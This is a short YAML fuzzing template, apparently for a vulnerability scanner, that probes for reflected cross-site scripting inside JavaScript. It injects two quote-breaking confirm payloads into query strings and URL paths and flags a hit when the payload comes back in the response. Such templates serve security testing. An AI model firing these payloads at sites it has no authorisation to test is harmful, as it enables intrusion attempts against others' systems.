# info to search signature
id: fuzz-reflect-xss-in-js-code
type: fuzz
info:
  name: Reflect XSS in js code
  risk: High

# origin: gonna come from Burp
payloads:
    - 'xssHere"-confirm`1`-"'
    - 'xssHere''-confirm`1`-'''	
      
requests:
  - generators:
      # Change exist content type or adding new one
      - Query("{{.payload}}")
      - Path("{{.payload}}", "*")
    detections:
      - >-
        StringSearch("response", "-confirm`1`-")
